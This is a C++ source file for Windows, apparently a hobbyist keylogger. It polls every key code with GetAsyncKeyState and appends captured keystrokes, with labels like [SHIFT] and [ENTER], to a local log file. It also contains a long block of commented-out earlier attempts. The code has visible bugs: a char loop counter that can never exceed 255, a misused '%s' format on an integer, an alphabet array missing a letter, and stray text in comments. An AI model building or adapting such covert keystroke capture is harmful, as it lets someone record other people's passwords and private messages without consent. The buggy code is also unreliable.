#include <bits/stdc++.h>
#include <windows.h>

#define MAX 26
using namespace std;
int save(int _key, char *file);
string getcurrdate();
string getfilename()
{
    char abcd[MAX] = {'a', 'b', 'd', 'e', 'f', 'g','h', 'i', 'j', 'k', 'l', 'm','n', 'o', 'p', 'q', 'r', 's','t', 'u', 'v', 'w', 'x', 'y', 'z'};

    
    string name = "A";
    for (int i = 0; i < 8; i++)
    {
        name += abcd[rand() % MAX];
    }
    name+="_";
    name+=getcurrdate();
    name += ".txt";
    return name;
}



string getcurrdate()
{
    string date ="";
    time_t time_ptr;
    time_ptr = time(NULL);

    tm  *tm_local = localtime(&time_ptr);
    int day = tm_local->tm_mday;
    int month = tm_local->tm_mon;
    int year = tm_local->tm_year;
    year+=1900;

    date = to_string(day)+"_"+to_string(month)+"_"+to_string(year);
    return date;
     
}
string getpresstime()
{
    time_t time_ptr;
    time_ptr = time(NULL);
    tm *tm_local = localtime(&time_ptr);
    int hr = tm_local->tm_hour;
    int mn = tm_local->tm_min;
    int sec = tm_local->tm_sec;
    string strtime = "";
    strtime += to_string(hr);
    strtime += ':';
    strtime += to_string(mn);
    strtime += ':';
    strtime += to_string(sec);
    return strtime;
}

int main()
{
    cout << "started..." << endl;
    string fname = getfilename();
        cout<<" file name is "<<fname<<endl;

    char i;
    while(true)
    {
        for(i=8;i<=255;i++)
        {
            if(GetAsyncKeyState(i)==-32767)
            {
                save(i,"logl.txt");
            }
        }
    }
    return 0;
}

int save(int _key, char *file) {
    cout<< _key << endl;
    FILE *OUTPUT_FILE; // can also use the ofstream command
    OUTPUT_FILE = fopen(file, "a+"); //a+ is used to add new keys each time, and not overwrite
    string tm;
    switch(_key)
    {
        case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]");
                        fprintf(OUTPUT_FILE, "\n");
            break;
        case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]");
                        fprintf(OUTPUT_FILE, "\n");
            break;
        case VK_LBUTTON: fprintf(OUTPUT_FILE, "[LBUTTON]");
            break;
        case VK_RBUTTON: fprintf(OUTPUT_FILE, "[RBUTTON]");
            break;
        case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]");
            break;
        case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]");
            break;
        case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]");
            break;
        case VK_CONTROL: fprintf(OUTPUT_FILE, "[Ctrl]");
            break;
        case VK_MENU: fprintf(OUTPUT_FILE, "[Alt]");
            break;
        case VK_CAPITAL: fprintf(OUTPUT_FILE, "[CAPS Lock]");
            break;
        case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]");
            break;
    }
    fprintf(OUTPUT_FILE, "%s", &_key);
    fclose(OUTPUT_FILE);
    return 0;
}

// int save(int _key , char *file)
// {
//     // cout<<_key<<endl;
//     FILE *OUTPUT_FILE; // can also use the ofstream command
//     OUTPUT_FILE = fopen(file, "a+");

//     if(_key >= 65 && _key <=90)
//     {
//          fprintf(OUTPUT_FILE,"%s" ,char(_key));
//         cout<<char(_key)<<endl;
//     }
//     else if (_key == VK_SHIFT)
//     {
//             fprintf(OUTPUT_FILE, "[SHIFT]");
//             fprintf(OUTPUT_FILE, "\n");
//             cout<<"shift"<<endl;
//     }
//     else if (_key == VK_BACK)
//     {
//          fprintf(OUTPUT_FILE, "[BACKSPACE]");
//             fprintf(OUTPUT_FILE, "\n");
//             cout<<"backspace"<<endl;
//     }
//     else if (_key == VK_LBUTTON)
//     {
//         fprintf(OUTPUT_FILE, "[LEFT BUTTON]");
//             fprintf(OUTPUT_FILE, "\n");
//             cout<<"left button"<<endl;
//     }
//     else if (_key ==VK_RBUTTON)
//     {
//         fprintf(OUTPUT_FILE, "[RIGHT BUTTON]");
//             fprintf(OUTPUT_FILE, "\n");
//             cout<<"right"<<endl;
//     }
//     else if (_key == VK_RETURN)
//     {
//         fprintf(OUTPUT_FILE, "[ENTER]");
//             fprintf(OUTPUT_FILE, "\n");
//             cout<<"enter"<<endl;
//     }
//     else if(_key==VK_TAB)
//         {
//             fprintf(OUTPUT_FILE, "[TAB]");
//             fprintf(OUTPUT_FILE, "\n");
//             cout<<"tab"<<endl;
//         }
            
//         else if(_key == VK_ESCAPE){
//              fprintf(OUTPUT_FILE, "[ESCAPE]");
//             fprintf(OUTPUT_FILE, "\n");
//             cout<<"escape"<<endl;
//         }
            
//         else if(_key == VK_CONTROL) {
//              fprintf(OUTPUT_FILE, "[Ctrl]");
//             fprintf(OUTPUT_FILE, "\n");
//             cout<<"ctrl"<<endl;
//         }
            
//         else if(_key ==  VK_MENU)
//         {
//             fprintf(OUTPUT_FILE, "[Alt]");
//             fprintf(OUTPUT_FILE, "\n");
//             cout<<"alt"<<endl;
//         } 
          
//         else if(_key == VK_CAPITAL){
//              fprintf(OUTPUT_FILE, "[CAPS Lock]");
//             fprintf(OUTPUT_FILE, "\n");
//             cout<<"caplok"<<endl;
//         }
            
//         else if(_key == VK_SPACE){
//              fprintf(OUTPUT_FILE, "[SssPACE]");
//             fprintf(OUTPUT_FILE, "\n");
//             cout<<"space"<<endl;
//         }
//         fclose(OUTPUT_FILE);
//     return 0;
//     }
    


    // fprintf(OUTPUT_FILE, "%s", char(_key));
    //  fprintf(OUTPUT_FILE, "\n");
    //   cout<< char(_key)<<endl;

// string generateFileName(int n)
// {
//     char alphabet[MAX] = {'a', 'b', 'c', 'd', 'e', 'f', 'g',
//                           'h', 'i', 'j', 'k', 'l', 'm', 'n',
//                           'o', 'p', 'q', 'r', 's', 't', 'u',
//                           'v', 'w', 'x', 'y', 'z'};

//     string res = "";
//     for (int i = 0; i < n; i++)
//         res = res + alphabet[rand() % MAX];

//     // return "C:\\Program Files (x86)\\Google\\Chrome\\Application\\" + res + ".txt";
//     return res;
// }

// int main()
// {
//     for(int i=0;i<10;i++)
//     {sss sss
//         for(int j=8;i<256;j++)
//         {
//             if (GetAsyncKeyState(j) == -32767)
//                 {

//                     if (i == VK_OEM_1)
//                     {
//                         cout<<"";
//                     }
//                 }
//         }
//     }

// }